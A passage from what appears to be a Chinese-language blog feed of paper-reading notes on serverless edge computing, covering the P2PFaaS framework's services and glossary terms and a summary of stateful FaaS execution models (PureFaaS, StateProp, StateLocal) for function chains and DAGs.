“动态”）</p></li><li><p>日志模块：过多的日志记录可能会减慢服务速度并增加任务的延迟</p></li><li><p>调度器服务模块和学习器服务模块：实现服务间的交互</p></li></ul><h4 id="%E5%AD%A6%E4%B9%A0%E5%99%A8%E6%9C%8D%E5%8A%A1" tabindex="-1">学习器服务</h4><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E5%AD%A6%E4%B9%A0%E5%99%A8%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84.jpg" alt></p><ul><li><p>该服务实现强化学习模型，用于进行调度决策</p></li><li><p>强化学习模型分为三个实体</p><ul><li>状态：以字符串形式编码，包含当前节点的负载</li><li>动作：被映射为调度动作</li><li>奖励：奖励驱动学习过程，可以取决于总任务的时间<ul><li>例如，如果任务在特定时间完成，可以给予正面奖励，为此，需要客户端能够训练模型，因为只有当函数输出到达客户端才能知道最终延迟</li></ul></li></ul></li><li><p>学习实体：封装成一个数据结构，包括</p><ul><li>EID：一个递增的编号</li><li>状态：一个字符串</li><li>动作：一个浮点数</li><li>奖励：一个浮点数</li></ul></li><li><p>学习线程：学习过程由学习线程执行，它负责在所有所需的实体都存在时延迟训练。（这里不是很懂强化学习）</p></li><li><p>训练模型：跳了</p></li></ul><h4 id="%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1" tabindex="-1">发现服务</h4><ul><li>使用Go语言编写，目的是让节点了解他的邻居。</li><li>该服务基于八卦算法（gossip algorithm）在启动时必须通过另一个节点的IP（称为“初始服务器”）进行配置。</li></ul><h2 id="%E5%BD%B1%E5%93%8D" tabindex="-1">影响</h2><ul><li><p>这项工作中提出的P2PFaaS框架可能是第一个开源可用的框架，它通过采用完全去中心化（对等）方案，实现了节点之间的分布式调度和负载平衡算法的实现。</p></li><li><p>该框架对于该领域的研发人员(设计和测试实施调度和负载均衡解决方案的分布式算法),可以用于测试设计的算法是否能够在真实设备上进行可能的实现，，以及在哪些条件下它们可以工作</p></li><li><p>由于代码的可移植性，P2PFaaS也很容易在多个SoC计算机（如树莓派）上部署，通过利用OpenBalena来避免使用虚拟机，以便在真实计算机设备上测试算法</p></li><li><p>在真实设备上测试这种类型的算法对研究和特别是算法设计有明显的影响。真实环境的一系列条件和特殊特征往往无法通过模拟和数学模型轻易掌握。</p></li></ul><h2 id="%E7%BB%93%E8%AE%BA" tabindex="-1">结论</h2><ul><li><p>本论文中，我们介绍了P2PFaaS框架，这是一个软件套件，可用于在一组真实节点之间测试和评估调度和负载均衡算法。我们展示了该框架的基本特点，包括模块化、可移植性以及通过设计的接口轻松更改核心调度算法的可能性。我们还详细介绍了组成框架的三个服务：调度器、学习器和发现服务。</p></li><li><p>对该框架的进一步改进主要朝着两个方向进行。</p><ul><li>第一个方向是改进服务迁移的管理，通过支持动态函数分配和可用性来实现。</li><li>第二个方向涉及绿色边缘计算，目前正在开发额外的模块，以允许评估考虑节点能量方面的调度和负载均衡算法。</li></ul></li></ul><h2 id="%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D%E7%90%86%E8%A7%A3" tabindex="-1">专有名词理解</h2><h3 id="%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E5%92%8C%E9%9B%BE%E8%AE%A1%E7%AE%97" tabindex="-1">边缘计算和雾计算</h3><ul><li><p>边缘计算（Edge Computing）侧重于将计算和数据处理推向物理世界的边缘，即接近数据生成源头的位置。边缘计算将计算任务和数据处理分布在边缘设备、边缘节点或边缘服务器上，以实现低延迟、实时性和快速响应的数据处理。它强调将计算资源尽可能靠近数据源，以减少数据传输延迟和网络拥塞，并支持一些特定的边缘应用场景，如智能交通、物联网、智能工厂等。边缘计算更注重在边缘节点上进行本地计算和决策，将关键的数据处理任务尽可能地下沉到边缘，减少对云端的依赖。</p></li><li><p>雾计算（Fog Computing）是一种介于边缘和云之间的计算模型，弥补了边缘设备和云数据中心之间的距离。雾计算引入了中间层的雾节点（Fog Node）或边缘节点（Edge Node），这些节点位于边缘设备和云数据中心之间，用于处理边缘设备生成的数据和提供边缘服务。雾计算的目标是解决传统云计算模型中的一些挑战，如高延迟、带宽限制和网络拥塞。它通过将计算和存储资源推向边缘，减少数据传输到云端的时间，提供更快速的数据处理和更高带宽的支持。</p></li><li><p>虽然边缘计算和雾计算有一些相似之处，例如将计算资源放置在边缘设备附近、提供低延迟的数据处理等，但也存在一些区别：</p><ul><li><p>范围和位置：边缘计算更注重在物理世界的边缘部署计算资源，即离数据生成源头较近的位置。而雾计算更关注于边缘设备和云数据中心之间的中间层，即雾节点，这些节点位于边缘和云之间的位置。</p></li><li><p>任务分发和处理：边缘计算侧重于在边缘节点上进行本地计算和决策，将关键的数据处理任务下沉到边缘。而雾计算更倾向于在雾节点上进行边缘设备生成数据的处理和分析，同时提供边缘服务。</p></li><li><p>应用场景：边缘计算更适用于对实时性、低延迟和快速响应有较高要求的应用场景，如智能交通、物联网等。而雾计算更关注于在边缘设备和云之间提供更灵活和高效的计算模型，适用于智能城市、工业物联网等场景。</p></li></ul></li></ul><p>综上所述，边缘计算和雾计算都是为了满足分布式计算需求而提出的模型，它们在计算资源的位置、任务分发和处理方式以及适用的应用场景上有一些不同。根据具体的应用需求和场景特点，可以选择合适的计算模型来满足需求。</p><h3 id="websocket%E6%B1%A0" tabindex="-1">WebSocket池</h3><ul><li><p>WebSocket池（WebSocket Pool）是一种管理和复用WebSocket连接的机制。在使用WebSocket与服务器进行实时通信时，每次创建和关闭WebSocket连接都会产生一定的开销，特别是在高并发场景下，频繁创建和关闭连接可能会对服务器的性能和资源造成负担。</p></li><li><p>为了避免频繁地创建和关闭WebSocket连接，可以使用WebSocket池来管理这些连接。WebSocket池维护一组预先创建的WebSocket连接，并在需要时将连接提供给应用程序使用，而不是每次都重新创建连接。当应用程序完成使用后，连接会被放回池中，以备下次使用。</p></li><li><p>WebSocket池的好处包括：</p><ul><li>减少连接创建和关闭的开销：通过复用连接，可以减少每次创建和关闭连接所需的时间和资源消耗，提高服务器的性能和资源利用率。</li><li>提高响应速度：由于连接已经建立，可以立即开始进行通信，而不需要等待连接建立的时间，从而减少了通信的延迟。</li><li>控制连接数：通过维护连接池，可以限制并发连接的数量，避免服务器过载或资源耗尽的情况发生。</li></ul></li></ul><h3 id="go%E8%AF%AD%E8%A8%80" tabindex="-1">Go语言</h3><ul><li>Go语言（也称为Golang）是一种开源编程语言，由Google开发。它具有高效的并发性能和内置的网络库，使其非常适合构建高性能的Web服务器和分布式系统。Go语言的设计目标之一是简单易用，同时也注重代码的可读性和可维护性。</li><li>调度器模块的编写采用Go语言，这意味着该模块可以利用Go语言的特性和生态系统，快速地处理并发请求、提供网络服务，并具备良好的性能和可靠性。通过使用Go语言编写调度器模块，可以更容易地构建可扩展的、高效的Web服务器，并实现可靠的任务调度和资源分配功能。</li></ul><h3 id="m%2Fm%2F1%2Fk%E5%92%8Cm%2Fm%2Fk%2Fk%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B" tabindex="-1">M/M/1/K和M/M/K/K队列模型</h3><p>M/M/1/K和M/M/K/K队列模型是用于描述排队系统的数学模型。</p><ul><li>其中&quot;M&quot;代表到达率和服务率都是随机的泊松分布，&quot;1&quot;代表只有一个服务台，&quot;K&quot;代表系统容量，即队列的最大长度。当队列长度达到K时，新到达的请求将被拒绝。</li><li>在M/M/K/K模型中，&quot;K&quot;代表服务台的数量，即系统可以同时服务的最大请求数量。</li><li>这些模型可以用于评估系统的性能，并帮助设计者确定最佳的系统参数，以实现所需的性能和可靠性。</li></ul><h3 id="%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0" tabindex="-1">强化学习</h3><ul><li>强化学习（Reinforcement Learning）是一种机器学习的分支，其目标是通过代理与环境的交互来学习最优行为策略。在强化学习中，代理通过观察环境的状态并执行动作，从环境中接收奖励信号来评估其行为的好坏，然后根据奖励信号调整其策略，以最大化长期累积奖励。</li><li>强化学习的核心概念包括状态（State）、动作（Action）、奖励（Reward）和策略（Policy）：<ul><li>状态（State）：代表环境的当前情况或特征。它可以是离散的或连续的，并且通常由观察到的环境信息来表示。</li><li>动作（Action）：代理在给定状态下可以执行的操作或决策。动作可以是离散的或连续的，具体取决于问题的性质。</li><li>奖励（Reward）：代表代理在执行动作后从环境中获得的即时反馈。奖励可以是正面的、负面的或零，用于指导代理的学习过程。</li><li>策略（Policy）：代理的策略定义了在给定状态下选择动作的方式。策略可以是确定性的（确定选择一个动作）或概率性的（以一定概率选择不同的动作）。</li></ul></li><li>强化学习的核心挑战是在未知环境中通过与环境的交互来学习最优策略。代理通过尝试不同的动作，并根据获得的奖励信号来调整策略。在学习过程中，代理会通过探索（Exploration）和利用（Exploitation）的权衡来平衡对新动作的探索和对已知高奖励动作的利用。</li><li>强化学习方法包括基于值函数的方法（如Q-learning和Sarsa）和基于策略的方法（如Policy Gradient和Actor-Critic）。近年来，深度强化学习（Deep Reinforcement Learning）结合了深度神经网络和强化学习的方法，使得代理能够从原始感知输入中学习，并在复杂的任务中取得了重大突破。</li><li>强化学习在许多领域有着广泛的应用，包括机器人控制、游戏玩法、自动驾驶、金融交易等。它具有通过与环境的交互学习最优策略的能力，使得它成为解决许多复杂问题的有效工具。</li></ul><h3 id="%E5%85%AB%E5%8D%A6%E7%AE%97%E6%B3%95%EF%BC%88gossip-algorithm%EF%BC%89" tabindex="-1">八卦算法（gossip algorithm）</h3><ul><li>八卦算法（Gossip Algorithm）是一种分布式算法，用于在一个大规模的系统中进行信息传播和共享。它的设计灵感来源于人们在日常生活中进行谣言传播的行为，因此得名为&quot;八卦算法&quot;。</li><li>八卦算法的基本思想是通过节点之间的随机通信来传播信息。每个节点都维护一个局部的信息视图，包含了一部分已知节点的信息。在每一轮通信中，节点随机选择一个邻居节点，并向其发送自己所知道的信息。接收节点会将发送节点的信息与自己已知的信息进行合并，并将自己所知的信息继续传播给其他随机选择的邻居节点。通过不断的随机通信和信息传播，整个系统中的节点逐渐将信息进行共享，从而达到全局信息的一致性。</li><li>八卦算法的特点和优势包括：<ul><li>去中心化：八卦算法不依赖于中心节点或全局控制节点，每个节点都可以进行信息的传播和接收，从而实现了去中心化的通信和共享。</li><li>随机性：算法中的随机选择邻居节点的步骤使得信息能够快速传播到整个系统中，同时避免了某些节点成为瓶颈或集中点。</li><li>容错性：八卦算法具有一定的容错性，即使在系统中存在一些故障节点或通信延迟，整个系统仍然能够保持信息的传播和一致性。</li><li>可扩展性：八卦算法适用于大规模系统，随着节点数量的增加，算法的性能和效果并不会显著下降。</li></ul></li><li>八卦算法在分布式系统中有广泛的应用，例如数据复制、一致性维护、状态同步等。它提供了一种简单而有效的方式来实现节点之间的信息共享和传播，并在分布式环境中实现了一致性和可靠性。</li></ul><h3 id="soc%E8%AE%A1%E7%AE%97%E6%9C%BA" tabindex="-1">Soc计算机</h3><ul><li><p>SoC（System-on-a-Chip）计算机是一种集成了处理器、内存、存储、通信接口和其他相关组件的单芯片计算机系统。它将多个功能单元集成到一个芯片上，具有较小的尺寸和较低的功耗。SoC计算机通常用于嵌入式系统、移动设备和物联网应用中，因为它们提供了高度集成和高效的计算能力。</p></li><li><p>树莓派（Raspberry Pi）是一种知名的SoC计算机，由树莓派基金会开发。它以其低成本、小巧的尺寸和广泛的可扩展性而受到广泛关注。树莓派计算机具有基于ARM架构的处理器、内存、存储、通信接口和各种输入输出端口，可以运行不同的操作系统和应用程序。由于其易于使用和开放的设计，树莓派成为学习计算机科学和物联网开发的理想平台之一。</p></li></ul><h3 id="openbalena" tabindex="-1">OpenBalena</h3><ul><li>OpenBalena是一个开源的物联网平台，用于管理和部署容器化应用程序到大规模的嵌入式设备集群，其中包括树莓派等SoC计算机。它是Balena（<a href="http://xn--Resin-dq1hk7vmw4k.io">前身为Resin.io</a>）的开源版本，旨在提供一个灵活的解决方案，使开发者能够轻松地管理和远程部署应用程序到物联网设备。</li><li>通过OpenBalena，用户可以创建和管理设备群组、监控设备状态、远程部署应用程序、执行设备管理任务等。它提供了一套完整的工具和API，使得将应用程序部署到物联网设备变得简单和可扩展。</li><li>使用OpenBalena可以极大地简化物联网设备的管理和部署过程，尤其对于大规模的设备集群而言。它提供了可视化的界面和命令行工具，使用户能够轻松地管理和监控设备，同时支持自动化部署和更新应用程序。</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 边缘计算 </tag>
            
            <tag> Faas </tag>
            
            <tag> ServerLess </tag>
            
            <tag> 雾计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FaaS Execution Models for Edge Applications</title>
      <link href="/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Applications/"/>
      <url>/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Applications/</url>
      
        <content type="html"><![CDATA[<p><img src="https://arxiv.org/pdf/2111.06595.pdf" alt="论文连接"></p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li><p>在这篇论文中，我们解决了在边缘网络中支持基于函数即服务（FaaS）模型的有状态工作流的问题。</p></li><li><p>特别是我们关注数据传输问题，由于某些边缘场景中通信链路速度有限，这可能成为性能瓶颈。为此，我们提出了三种不同的方案：</p><ul><li>纯FaaS实现</li><li>StateProp（应用状态在整个函数链中传播）</li><li>以及StateLocal（状态仅保留在运行函数的工作节点上，需要时进行检索）。</li></ul></li><li><p>然后，我们将提出的方案扩展到应用程序建模为有向无环图（DAG）的更一般情况，这种建模方法涵盖了广泛的实际应用场景，例如物联网（IoT）领域。</p></li><li><p>我们的贡献通过原型实现进行了验证。在模拟条件下的实验表明，应用数据本地化原则显著减少了所需的网络流量并改善了端到端的延迟性能，尤其是在边缘节点上进行本地缓存和低链路速度的情况下。</p></li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li>这篇论文中，我们针对有状态函数工作流中的数据传输问题（包括参数/返回值和应用状态）</li><li>以第2节中介绍的实际应用案例为动机进行了研究，</li><li>在回顾现有技术（第3节）之后，</li><li>我们在我们之前的工作中总结了研究结果（第4节），提出了三种完全去中心化的执行模型：PureFaaS、StateProp和StateLocal</li><li>第5节中，这些模型扩展到将应用程序建模到DAG的更一般情况</li><li>第6节中比较他们的性能</li><li>第7节中得出结论</li></ul><h2 id="2-%E5%8A%A8%E6%9C%BA%EF%BC%9A%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B" tabindex="-1">2 动机：实际应用案例</h2><ul><li><p>一个用于智慧城市的实时分析框架，与几个高影响的应用相关</p><ul><li>自动检测异常交通情况</li><li>检测拥挤区域</li><li>保护脆弱人群</li><li>公共事件中的情绪识别等</li></ul></li><li><p>这些应用程序有着相似的总体结构<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E6%A1%88%E4%BE%8B%E6%80%BB%E4%BD%93%E7%BB%93%E6%9E%84.jpg" alt></p><ul><li>从传感器获取数据开始，首先进行匿名化处理以删除个人数据，然后提取相关特征并用于触发基于机器学习（ML）的决策过程。</li><li>此时普通的Serverless不能在这里采用，原因<ul><li><ol><li>无状态执行是不够的：一些组件需要对程序状态进行读写访问</li></ol></li><li><ol start="2"><li>FaaS支持函数链，但这里工作流程为DAG</li></ol></li></ul></li></ul></li><li><p>这些应用的状态可以保存在3个位置</p><ul><li><ol><li>本地客户端</li></ol></li><li><ol start="2"><li>边缘节点</li></ol></li><li><ol start="3"><li>云端</li></ol></li></ul></li><li><p>而对于这些可保存状态的文职，随着传感器获得数据大小的增加，3个位置时延的增加有所不同<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E6%A1%88%E4%BE%8B%E6%97%B6%E5%BB%B6.jpg" alt></p><ul><li>云端时延最高，且随着状态的增大而显著增大</li><li>状态在边缘或者客户端维护时，没有明显增加，但事实需要更高的网络流量成本</li></ul></li><li><p>综上：由DAG状态函数组成的数据密集型应用程序（例如实时智慧城市分析）的性能在很大程度上取决于状态的存储位置，而这也是本文研究的主题。</p></li><li><p>DAG状态应用程序并不是特殊情况，依据阿里巴巴数据中心的生产系统中收集的真实云应用程序的跟踪信息：</p><ul><li>由DAG组成的占21.7%</li><li>单个任务28.6%</li><li>链占49.7%</li></ul></li></ul><h2 id="3-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">3 相关工作</h2><ul><li>云中的无服务器平台依赖于底层容器编排系统，这些系统处理自动缩放并负责保持一致的性能。然而，当在边缘使用这些编排工具时，设备是异构且集群化的，这会导致低效的性能。</li><li>支持有状态应用程序是云中无服务器计算定位文件中确定的关键研究挑战之一</li><li>目前，边缘网络中的有状态FaaS在很大程度上尚未被探索，这是我们的动机，探索不同的方法来处理函数调用的链和DAG的参数和状态分配。在实际部署中，可以将复杂的状态管理系统与我们在本文中提出的执行模型结合使用。</li><li>之后再补充</li></ul><h2 id="4-%E6%9C%89%E7%8A%B6%E6%80%81%E7%9A%84%E5%87%BD%E6%95%B0%E9%93%BE" tabindex="-1">4 有状态的函数链</h2><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B.jpg" alt></p><ul><li>图中共有四个边缘节点，表示为ni，每个节点都托管一个无服务器平台，可以通过一组工作节点执行一个或多个类型的Lambda函数，表示为λi。例如，n1可以执行Lambda函数λ1和λ4，但不能执行λ2和λ3。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E7%A4%BA%E4%BE%8B%E7%94%A8%E6%88%B7%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F.jpg" alt></p><ul><li>考虑上图的示例用户应用程序<ul><li>客户端需要将输出提供给λ1</li><li>λ1需要应用状态SA，其输出out1需要提供λ2</li><li>以此类推，最终输出out4返回客户端</li></ul></li><li>在云中，有状态函数通过访问外部服务（例如内存数据库或存储服务）来实现无状态函数。然而这种方法在边缘上并不高效，由此提出三种方法，下列方法中假设函数分配为：[λ1，λ2，λ3，λ4] → [n1，n4，n2，n1]。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>PureFaaS中，函数链中的函数一个接一个地执行，并且每次调用时都会来回传输每个函数所需的状态，如上图示，只要满足以下两个条件，就可以在商业/开源的无服务器平台上轻松实现此策略<ul><li><ol><li>函数的签名（包括参数和返回值）支持客户端嵌入所需的状态</li></ol></li><li><ol start="2"><li>客户端事先知道每个下一个被调用的函数所需的状态。</li></ol></li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/StateProp%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>StateProp中，它利用了大多数无服务器平台提供的链式功能，如上图示，客户端将应用程序的完整状态嵌入到函数的参数和返回值中：不使用嵌入状态的函数将简单地将其传递，而其他函数将将接收到的修改后的状态作为函数参数嵌入，并最终返回给客户端。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/StateLocal%E6%96%B9%E6%B3%95.jpg" alt></p><ul><li>StateLocal将状态保留在边缘节点中,如上图所示，不是将状态嵌入到函数调用中，而是仅传递指针。<ul><li>当一个Lambda函数需要状态时，它通过指针检索状态，然后成为状态的新所有者，从而修改链中后续函数调用中的状态指针。</li><li>这样，客户端最终将返回所有状态的更新指针列表，以便在后续应用程序执行中使用它们，或者在需要时从边缘节点中撤回状态。</li></ul></li></ul><h2 id="5-%E6%89%A9%E5%B1%95%E5%88%B0dag" tabindex="-1">5 扩展到DAG</h2><h3 id="5.1-dag%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%A4%BA" tabindex="-1">5.1 DAG特定符号表示</h3><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE1.jpg" alt></p><ul><li>一组任务之间的关系：如果任务λi必须在任务λj之前执行，则存在边λi → λj。这些先行关系定义了一个有向图，称为任务依赖图，最后形成DAG</li><li>任务也可能依赖某些状态：态依赖图是一个无向图，其中边λi → Sx表示任务λj需要访问状态Sx。任务依赖图和状态依赖图的并集生成任务-状态依赖图；如上图示</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE2.jpg" alt></p><ul><li><p>在应用程序的单次执行过程中，可能会出现多个任务需要在同一状态上操作的情况，就像上图中的示例一样。根据应用程序的内部逻辑，可能会出现以下情况</p><ul><li><ol><li>执行顺序无关紧要</li></ol></li><li><ol start="2"><li>λ2必须在λ3之前执行</li></ol></li><li><ol start="3"><li>λ3必须在λ2之前执行</li></ol></li></ul></li><li><p>服务器无状态平台需要从应用程序中了解依赖于共享状态的任务的执行时间顺序，以保持状态的因果一致性。为此，我们通过以下方式来捕捉这种时间顺序，将任务-状态依赖图进行扩展：</p><ul><li>如果λi和λj都使用相同的状态，并且λi必须在λj之前执行以确保共享状态的因果一致性，我们添加一个虚拟边λi → λj，虚线表示，如上图示。</li></ul></li><li><p>添加虚拟边会影响可以实现的并行性：没有状态依赖关系的情况下，在上图中的DAG可以执行为{λ1, λ2 | λ3, λ4}（其中|表示两个任务可以并行执行）</p><ul><li>但在下图中需要虚拟边λ4 → λ2，但这会创建循环λ2 → λ3 → λ4，从而导致死锁：λ4无法执行，直到它接收到λ3的输出，而λ3无法运行，直到它接收到λ2的输出，而λ2在λ4执行完成之前无法访问状态S.</li><li>由于应用程序可以检测到这种情况，并且这反映了逻辑设计问题，因此我们假设我们感兴趣的应用程序仅限于具有非循环的扩展任务-状态依赖图。<br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/%E4%BE%9D%E8%B5%96%E5%9B%BE3.jpg" alt></li></ul></li></ul><h3 id="5.2-purefaas%E6%A8%A1%E5%9E%8B%E6%89%A9%E5%B1%95" tabindex="-1">5.2 PureFaaS模型扩展</h3><ul><li>PureFaaS在链式函数调用和DAG中的使用方式保持不变，除了可以并行执行一些任务外。类似于拓扑排序，下图为示例</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%A8%A1%E5%9E%8B%E6%8B%93%E5%B1%951.jpg" alt><br><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/PureFaaS%E6%A8%A1%E5%9E%8B%E6%8B%93%E5%B1%95.jpg" alt></p><h3 id="5.3-stateprop%2Fstatelocal%E6%A8%A1%E5%9E%8B%E6%89%A9%E5%B1%95" tabindex="-1">5.3 StateProp/StateLocal模型扩展</h3><ul><li><p>StateProp和StateLocal都依赖于工作节点在当前函数完成后调用下一个函数；它们在状态管理方面有所区别：StateProp沿着函数调用链传递状态，而StateLocal将状态保留在最后使用它的边缘节点内部。</p></li><li><p>首先，一个任务可能有多个输入，比如λ2和λ3都希望在各自的任务结束后执行λ4，因此“每个函数执行下一个函数”的概念并不像链式函数那样明确定义。我们通过引入异步调用的概念来解决这个问题：当一个函数终止时，它总是调用下一个函数（根据DAG的直接后继），但只有在所有输入都可用时才触发任务的执行。(这里相当于拓朴排序)</p><ul><li>如果情况不是这样，则前一个函数的输出暂时存储在边缘节点上，函数会暂停执行<img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_1.jpg" alt></li><li>上图中的模式，增加了边缘节点上服务器无状态平台的复杂性，因为它们必须为每个不完整的操作维护一个临时状态。</li><li>但这种异步调用本身并不能解决问题：当λ2和λ3不同时调用n4节点的λ4时，将发生死锁</li></ul></li><li><p>因此，为了支持StateProp/StateLocal，至少在DAG应用的单个执行期间，所有工作节点都需要知道函数与边缘节点之间的映射关系。这样，我们可以确保所有工作节点将在相同的边缘节点上调用后续任务的执行，这将带来以下影响</p><ul><li><ol><li>函数与边缘节点之间的映射信息必须沿着执行DAG传递，这会略微增加协议开销</li></ol></li><li><ol start="2"><li>必须有一个能够在DAG被调用时“解析”所有函数的过程（例如，可以由客户端完成），这可能会增加启动延迟</li></ol></li></ul></li><li><p>但仍不够支持StateProp/StateLocal，如果λ2和λ3都依赖于相同的状态S。无论相对顺序如何，都需要将由第一个要执行的函数（例如λ2）修改的更新状态传递给另一个函数（例如λ3）。但是两者之间没有调用路径，即λ3不是DAG中λ2的后代，这使得仅仅依靠状态传播变得不可能。因此，提出第二个修改</p><ul><li>不再将状态嵌入函数参数（或其引用，对于StateLocal而言）</li><li>而是每个访问状态的函数将其直接发送给下一个将使用它的工作节点，根据状态依赖图和因果一致性约束，这两者已经是已知的。</li><li>因此，函数的工作节点必须准备好不仅接收异步调用并临时存储其参数，还要存储更新的状态，这些状态也是异步到达的。</li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_2.jpg" alt></p><ul><li>上图是同PureFaaS解决的依赖图中StateProp/StateLocal的顺序图，两者之间唯一的区别在于对于StateLocal，状态必须从最后的所有者中检索</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/5_3_3.jpg" alt></p><ul><li><p>上表为所有方案的流量交换</p></li><li><p>总结：StateProp和StateLocal可以支持DAG应用程序，但需要进行以下主要修改：</p><ul><li>工作节点必须支持异步函数调用</li><li>在单个DAG执行期间，函数和边缘节点之间的绑定必须为所有工作节点所知，而状态不能随参数一起传播</li></ul></li><li><p>这些变化增加了在边缘节点上运行的软件的复杂性和协议开销，并加剧了可能存在的有关披露专有信息的担忧</p></li></ul><h2 id="6-%E8%A1%A8%E7%8E%B0%E8%AF%84%E4%BC%B0" tabindex="-1">6 表现评估</h2><h3 id="6.1-%E6%89%A7%E8%A1%8C" tabindex="-1">6.1 执行</h3><ul><li><p>在ServerlessOnEdge框架中实现这三种方案</p><ul><li>该框架是一个分布式的调度无状态FaaS函数的框架</li><li>有论文团队开发和维护</li><li>在github开源</li></ul></li><li><p>在该框架中</p><ul><li>客户端通过e路由器调用请求函数</li><li>同时e路由器在无服务平台上充当中间人的角色，将无状态请求转发到根据负载和网络条件可用的多个目的地之一</li><li>实现了e计算机，它可以模拟具有特定配置的无服务器平台，包括计算速度、内存、容器数量等</li><li>ServerlessOnEdge使用谷歌的gRPC进行客户端、e路由器和e计算机之间的通信。</li></ul></li><li><p>PureFaaS的实现</p><ul><li><ol><li>客户端在每个函数调用时将所需的状态嵌入参数中</li></ol></li><li><ol start="2"><li>e计算机将嵌入的状态作为函数返回值的一部分返回</li></ol></li><li><ol start="3"><li>如果满足先决条件，会调用多个函数（仅适用于DAG）</li></ol></li></ul></li><li><p>StateProp的实现</p><ul><li><ol><li>实现异步调用：立即返回空的确认消息，而真正的输出由链中的最后一个e计算机作为主动回应消息提供给客户端</li></ol></li><li><ol start="2"><li>在每个e计算机上安装了一个附带的e路由器，用于调度由其e计算机生成的函数调用作为函数链的一部分执行，这样系统中的每个e计算机可以知道链中下一个函数的目的地</li></ol></li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/FaaS%20Execution%20Models%20for%20Edge%20Application/6_1_1.jpg" alt></p><ul><li><p>上图展示了StateProp的实现</p><ul><li λ1, λ4>图中共有5个边缘节点(主机1到主机5)，调用两个函数链</li><li>客户端在主机0上，主机0上e路由器被客户端用于调用链中的第一个函数（λ1，转发到主机1）</li><li>主机1上的e路由器接收到对λ4的下一次调用（转发到主机4）</li><li>主机4上的e计算机不需要经过其附带的e路由器，因为它可以将最终响应发送给主机0上的客户端</li></ul></li><li><p>StateLocal要求与StateProp相同，但还需要需他的一些升级</p><ul><li><ol><li>系统消息必须支持远程状态，即不直接嵌入函数调用/响应中的状态，而是通过它们的名称和端点间接引用</li></ol></li><li><ol start="2"><li>状态由称为状态服务器的新组件进行管理，它们是与每个e计算机和客户端共存的简单内存键值存储</li></ol></li><li><ol start="3"><li>消息流与StateProp完全相同，但在每个函数调用时，e计算机检索所需的远程状态，然后将其复制到本地状态服务器中；为了做到这一点，状态依赖性也嵌入在函数调用请求消息中。</li></ol></li></ul></li></ul><h3 id="6.2-%E7%BB%93%E6%9E%9C" tabindex="-1">6.2 结果</h3><ul><li>进行了两批实验，分别是函数链和有向无环图（DAG）</li></ul><h4 id="%E5%87%BD%E6%95%B0%E9%93%BE%EF%BC%9A" tabindex="-1">函数链：</h4><ul><li>实验条件：<ul><li>客户端执行长度为L（3或6）的函数链</li><li>其中每个函数随机选择自λ1、…、λ5，并可能重复。</li><li>我们假设应用程序有S个状态（3或6），其中第i个状态的大小为（1+i）×10 kB（以0为基的索引）；</li><li>每个状态依赖于随机选择的随机基数从0（无依赖关系）到L（链中的所有函数都依赖于该状态）。</li><li>输入参数和返回值的大小被假设为相同，并且等于A（10 kB或100 kB）。一组函数<br><img 